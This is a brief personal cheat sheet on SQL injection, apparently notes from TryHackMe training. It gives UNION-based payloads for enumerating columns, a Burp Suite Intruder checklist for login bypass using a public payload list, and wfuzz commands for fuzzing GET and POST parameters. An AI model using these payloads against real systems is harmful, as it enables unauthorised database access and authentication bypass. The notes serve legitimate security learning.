- - -
**Cool payloads** : [https://tryhackme.com/room/sqlinjectionlm](https://tryhackme.com/room/sqlinjectionlm)
- - -

##### Increase the number to determine the number of columns : 
```mysql
' ORDER BY 1--
```

##### Confirm the "Order by" statement : (Same thing as above ☝️☝️)
```mysql
' UNION SELECT NULL,NULL,NULL--
```

##### Define string/numerical data in columns : 
```mysql
' UNION SELECT NULL,NULL,'a',NULL--
```

- - - 
#### **Sql-login-bypass** :

☐ Open Burp-suite
☐ Make and intercept a request
☐ Send to intruder
☐ Cluster attack.
☐ Paste in sqlibypass-list ([I am Wordlist !!](https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt))
☐ Attack
☐ Check for response length variation
- - -

#### **FUZZING** **:**

**<u>Fuzzing GET parameter</u>** :

```sh
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"
```


**<u>Fuzzing POST parameter</u>** :

```sh
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"
```

- - -


